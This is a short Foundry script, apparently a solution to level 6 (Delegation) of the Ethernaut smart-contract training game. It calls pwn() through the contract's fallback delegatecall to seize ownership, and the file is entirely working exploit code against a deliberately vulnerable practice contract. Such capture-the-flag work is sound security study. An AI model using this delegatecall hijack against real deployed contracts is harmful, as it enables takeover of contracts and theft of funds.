// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Delegation} from "src/06/Delegation.sol";


contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL6"); 
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Delegation level = Delegation(instance); 
        
    function run() external {
        vm.startBroadcast(hacker);
        (bool success, ) = address(level).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);
        vm.stopBroadcast();
    }
}